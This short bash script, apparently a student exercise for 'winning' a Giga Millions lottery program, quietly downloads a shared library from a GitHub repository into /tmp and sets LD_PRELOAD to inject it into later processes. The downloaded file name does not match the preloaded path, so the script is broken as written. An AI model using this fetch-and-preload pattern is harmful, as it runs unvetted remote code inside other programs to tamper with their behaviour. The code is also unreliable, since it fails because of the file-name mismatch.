#!/bin/bash
wget -q -O /tmp/gigamillion.so https://github.com/SravanthiSinha/ShellScripts/raw/master/win_Giga_Millions/gigamillions.so
export LD_PRELOAD=/tmp/gigamillions.so
